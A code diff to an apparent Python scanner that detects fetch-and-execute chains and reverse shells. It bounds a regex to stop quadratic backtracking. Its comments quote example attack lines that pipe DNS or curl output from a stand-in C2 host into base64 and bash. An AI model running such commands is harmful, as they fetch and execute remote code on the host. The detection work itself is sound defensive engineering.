@@ -39,8 +39,12 @@ _SHELL_SUBSHELL_FETCH = re.compile(r"\$\((?:\s*)(curl|wget)\b", re.I)
 # Fetch-and-execute, tolerant of intermediate stages: a remote fetcher (incl. dig/
 # nslookup used as a covert channel) piped through anything into an interpreter or
 # decoder — e.g. `dig +short TXT c2.evil | base64 -d | bash`, `curl x | tee | sh`.
+# The two runs are LENGTH-BOUNDED ({0,256}) so this stays linear — an unbounded
+# `[^\n]*\|[^\n]*` backtracks quadratically on adversarial input (a committed 1MB
+# git hook of a fetcher + many pipes could hang the scanner thread). 256 chars each
+# side comfortably spans real fetch→decode→shell chains.
 _FETCH_PIPE_EXEC = re.compile(
-    r"\b(?:curl|wget|fetch|dig|nslookup|host)\b[^\n]*\|[^\n]*\b(?:sh|bash|zsh|python\d?|base64)\b",
+    r"\b(?:curl|wget|fetch|dig|nslookup|host)\b[^\n]{0,256}\|[^\n]{0,256}\b(?:sh|bash|zsh|python\d?|base64)\b",
     re.I,
 )
 # Reverse shells: the bash /dev/tcp trick, an interactive shell redirected to a
